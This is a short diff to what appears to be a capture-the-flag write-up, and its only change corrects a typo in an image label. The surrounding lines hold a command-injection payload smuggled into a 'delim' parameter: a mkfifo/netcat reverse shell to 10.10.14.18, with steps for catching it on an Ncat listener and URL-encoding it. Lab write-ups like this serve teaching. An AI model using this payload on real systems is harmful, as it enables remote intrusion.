@@ -307,7 +307,7 @@ delim=coma;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 444
 And let's start a Ncat listener on port 4444 to catch the reverse shell if it works. 
 <br>
 
-![Start-Ncat-Listenner](img/start_ncat_listen.png) 
+![Start-Ncat-Listener](img/start_ncat_listen.png) 
 <br>
 
 Don't forget to highlight everything after `delim=` and hit `CTRL + U` to url encode the payload sent to the `delim` parameter.
